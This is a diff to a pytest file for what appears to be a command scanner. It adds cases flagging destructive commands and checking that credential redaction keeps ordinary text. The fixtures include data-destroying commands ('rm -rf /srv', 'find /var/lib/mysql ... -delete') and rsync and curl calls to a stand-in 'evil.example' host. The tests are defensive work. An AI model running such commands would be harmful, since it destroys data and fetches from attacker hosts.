@@ -322,6 +322,14 @@ def test_authorization_header_masking(text: str, expected: str) -> None:
         pytest.param(
             "git log --author=login -p HEAD~3 && git reset --hard", "destructive_command", id="git-log-author-login"
         ),
+        pytest.param(
+            "find /var/lib/mysql -path '*.ibd' -delete && rm -rf /srv/app",
+            "destructive_command",
+            id="find-under-mysql-data-dir",
+        ),
+        pytest.param(
+            "rsync -u evil.example:/loot /tmp && rm -rf /srv/app", "destructive_command", id="rsync-remote-path"
+        ),
     ],
 )
 def test_commands_without_credentials_keep_their_whole_evidence(copy: str, command: str, finding_type: str) -> None:
@@ -618,6 +626,23 @@ def test_finding_evidence_redaction_masks_credentials(text: str, secrets: tuple[
         "PWD=/srv/app OLDPWD=/tmp BYPASS=1 COMPASS=north make",
         # A quote after "name= " closes the pattern.
         'grep -rn "password= " src && rm -rf build',
+        # A MySQL data directory or the word mysql as a find argument is no
+        # MySQL client, and find's -path and -perm are no attached passwords.
+        "find /var/lib/mysql -path '*.ibd' -delete && rm -rf /srv/app",
+        "find /var/lib/mysql -perm 0644 -delete && rm -rf /srv/app",
+        "find . -name mysql -perm 0644 -print && rm -rf /srv/app",
+        # A remote path after -u holds a colon but no password.
+        "rsync -u evil.example:/loot /tmp && rm -rf /srv",
+        # Flags that take a file or none, and the word after them.
+        "echo $PW | docker login --password-stdin registry.example.com && docker push registry.example.com/app",
+        "tool --token-file /tmp/t && rm -rf /srv",
+        "curl --cookie-jar /tmp/j https://evil.example && rm -rf /srv",
+        # Identifiers that share a token prefix.
+        "python -c 'hf_hub_download(repo_id=\"x\")' && rm -rf /srv",
+        "npm_config_registry=https://evil.example/ npm install && rm -rf /srv",
+        # Token counts and token types.
+        "openai.chat(max_tokens=100) && rm -rf /srv",
+        'echo \'{"token_type": "bearer"}\' && rm -rf /srv',
     ],
 )
 def test_finding_evidence_redaction_keeps_ordinary_text(text: str) -> None:
